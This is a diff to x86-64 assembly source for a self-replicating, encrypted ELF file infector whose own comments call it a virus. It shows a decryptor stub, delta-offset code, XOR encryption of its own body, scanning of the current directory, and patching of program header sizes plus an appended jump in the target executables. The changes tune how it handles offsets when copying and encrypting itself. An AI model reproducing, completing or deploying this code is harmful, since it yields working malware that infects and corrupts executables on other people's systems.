@@ -13,7 +13,7 @@ decryptor:
     pop rbp ; We pop this address into rbp
     sub rbp, .delta ; by substracting delta we get the adress of the virus at runtime
 
-  mov r9, [rbp + key + dev_urandom - v_stop + 1]
+  mov r9, [rbp + key + dev_urandom - v_stop + 1] ; load key
   
   mov r12, v_stop - _start ; size of stuff we wish to decrypt
   lea rsi, [rbp + _start]
@@ -44,10 +44,7 @@ _start:
   je .after_adjust
     mov r12d, dev_urandom - v_stop + 1 ; add the difference
   .after_adjust:
-  mov [r15 + OFFSET], r12d ; store the offset
-  ; xor rax, rax
-  ; mov byte[rax], 0
-  ; jmp .after_adjust
+    mov [r15 + OFFSET], r12d ; store the offset
 
   mov DWORD [r15 + FINGERPRINT_ADD], 0 ; initialize to 0
 
@@ -259,6 +256,7 @@ _start:
   ; no 'test' program found, we can continue safely
 
   ; --- Open "."
+  .start_open:
   push "." ; push "." to stack (rsp)
   mov rdi, rsp
   mov rsi, O_RDONLY ; 
@@ -426,9 +424,7 @@ _start:
 
       ; copy decryptor on the stack
       mov r12, _start - decryptor ; size to copy
-      xor rax, rax
-      mov eax, [r15 + OFFSET] ; load the offset we need to add
-      lea rsi, [rbp + decryptor + rax] 
+      lea rsi, [rbp + decryptor]
       lea rax, [r15 + STACK_SIZE]
       xor rdi, rdi ; init rdi
       .memcpy_decryptor:
@@ -442,8 +438,7 @@ _start:
 
       mov r12, v_stop - _start ; size to copy
       xor rax, rax
-      mov eax, [r15 + OFFSET]
-      lea rsi, [rbp + _start + rax] 
+      lea rsi, [rbp + _start]
       lea rax, [r15 + STACK_SIZE + _start - decryptor] ; only encrypt from _start
       xor rdi, rdi
       .memcpy_and_encrypt:
@@ -484,8 +479,8 @@ _start:
       mov [r15 + PHDR_VADDR], r13 ; change vaddr to (stat.st_size + VADDR)
 
       mov qword [r15 + PHDR_ALIGN], ALIGN ; make sure alignment is correct ; SCOTT check
-      add qword [r15 + PHDR_FILESZ], exit - decryptor + JMP_REL_SIZE ; + signature_len + fingerprint_len ; adjust filesize. Add + 5 because of jmp instruction
-      add qword [r15 + PHDR_MEMSZ], exit - decryptor + JMP_REL_SIZE; + signature_len + fingerprint_len ; adjust memsize. Add + 5 because of jmp instruction.
+      add qword [r15 + PHDR_FILESZ], exit - decryptor + JMP_REL_SIZE ; adjust filesize
+      add qword [r15 + PHDR_MEMSZ], exit - decryptor + JMP_REL_SIZE; adjust memsize
 
       ; -- Write the patched header
       ; pwrite(fd, buf, count, offset)
@@ -533,7 +528,7 @@ _start:
       sub r14, rdx ; scott
       sub r14, v_stop - decryptor ; scott
       mov byte [r15 + JMP_REL], 0xe9 ; jmp instruction
-      mov dword [r15 + JMP_REL + 1], r14d ; scott why
+      mov dword [r15 + JMP_REL + 1], r14d
 
       ; Write patched jmp to EOF
       mov rdi, r9 ; load fd
